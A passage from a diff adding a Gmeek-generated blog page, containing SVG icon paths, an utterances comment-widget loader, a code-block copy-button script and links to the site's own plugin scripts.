1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
